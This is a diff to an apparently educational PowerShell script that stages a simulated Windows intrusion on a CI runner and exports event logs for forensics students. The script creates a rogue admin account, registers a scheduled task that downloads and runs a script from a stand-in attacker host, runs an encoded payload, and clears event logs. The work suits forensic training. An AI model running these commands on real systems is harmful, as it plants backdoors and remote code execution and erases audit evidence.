@@ -3,11 +3,15 @@
 
   Se ejecuta en un runner windows-latest de GitHub Actions (con privilegios de
   admin) y produce evidencia REAL: activa las audit policies, instala Sysmon,
-  ejecuta un escenario de intrusion y exporta los .evtx. El alumno los descarga y
-  los analiza en su Event Viewer.
+  limpia los logs para dejarlos enfocados, ejecuta un escenario de intrusion y
+  exporta los .evtx. El alumno los descarga y los analiza en su Event Viewer.
+
+  La flag se lee de la variable de entorno SI_FLAG (NUNCA se pasa por linea de
+  comandos, para que no se filtre en la telemetria de creacion de procesos). Solo
+  aparece en el script block decodificado (4104) del -EncodedCommand.
 
   Escenario (Silent Intruder):
-    1. Brute force RDP: varios logons fallidos (4625) contra 'administrator'.
+    1. Brute force: varios logons fallidos (4625) contra 'administrator'.
     2. Acceso: un logon con exito (4624).
     3. Cuenta rogue: se crea h.mercer y se mete en Administradores (4720, 4732).
     4. Persistencia: tarea programada 'OneDriveSync' al inicio de sesion (4698).
@@ -17,25 +21,26 @@
   Account), T1053.005 (Scheduled Task), T1059.001 (PowerShell), T1027 (Obfuscated).
 #>
 param(
-  [string]$Flag = "NORTHWIND{th15_15_n0t_th3_r34l_fl4g}",
   [string]$OutDir = "C:\evidence"
 )
 $ErrorActionPreference = "Continue"
+# La flag SOLO desde el entorno (nunca por linea de comandos).
+$Flag = $env:SI_FLAG
+if (-not $Flag) { $Flag = "NORTHWIND{unset_flag}" }
 New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
 
-Write-Host "[*] 1/5 Activando audit policies..."
+Write-Host "[*] 1/6 Activando audit policies..."
 auditpol /set /subcategory:"Logon" /success:enable /failure:enable | Out-Null
 auditpol /set /subcategory:"Logoff" /success:enable | Out-Null
 auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable | Out-Null
 auditpol /set /subcategory:"Security Group Management" /success:enable | Out-Null
 auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable | Out-Null
 auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
-# Command line en 4688 + Script Block Logging (4104)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
 
-Write-Host "[*] 2/5 Instalando Sysmon (config SwiftOnSecurity)..."
+Write-Host "[*] 2/6 Instalando Sysmon (config SwiftOnSecurity)..."
 try {
   Invoke-WebRequest -UseBasicParsing -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
   Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\sysmon" -Force
@@ -44,7 +49,13 @@ try {
   Start-Sleep -Seconds 5
 } catch { Write-Host "[!] Sysmon no disponible: $_" }
 
-Write-Host "[*] 3/5 Ejecutando el escenario de intrusion..."
+Write-Host "[*] 3/6 Limpiando los logs (evidencia enfocada en el incidente)..."
+wevtutil cl Security 2>$null
+wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>$null
+Start-Sleep -Seconds 2
+
+Write-Host "[*] 4/6 Ejecutando el escenario de intrusion..."
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -66,17 +77,17 @@ net localgroup Administrators h.mercer /add | Out-Null
 [NativeLogon]::LogonUser("h.mercer", $env:COMPUTERNAME, "W1nt3r-2026!", 2, 0, [ref]$tok) | Out-Null
 # 4) Persistencia -> 4698 (scheduled task al logon)
 schtasks /create /tn "OneDriveSync" /tr "powershell.exe -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://updates.northw1nd-cdn.com/s.ps1')" /sc onlogon /ru System /f | Out-Null
-# 5) PowerShell EncodedCommand -> 4104 (la flag va dentro del payload)
+# 5) PowerShell EncodedCommand -> 4104 (la flag va dentro del payload, no en la cmdline)
 $payload = "`$ErrorActionPreference='SilentlyContinue'; `$c2='updates.northw1nd-cdn.com'; `$beacon_key='$Flag'; Write-Output ('exfil staged: ' + `$beacon_key)"
 $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
 powershell.exe -NoProfile -EncodedCommand $enc | Out-Null
 
 Start-Sleep -Seconds 8
 
-Write-Host "[*] 4/5 Exportando los .evtx..."
+Write-Host "[*] 5/6 Exportando los .evtx..."
 wevtutil epl Security "$OutDir\Security.evtx" /ow:true
 wevtutil epl "Microsoft-Windows-Sysmon/Operational" "$OutDir\Sysmon.evtx" /ow:true
 wevtutil epl "Microsoft-Windows-PowerShell/Operational" "$OutDir\PowerShell.evtx" /ow:true
 
-Write-Host "[*] 5/5 Evidencia generada:"
+Write-Host "[*] 6/6 Evidencia generada:"
 Get-ChildItem $OutDir | Format-Table Name, Length
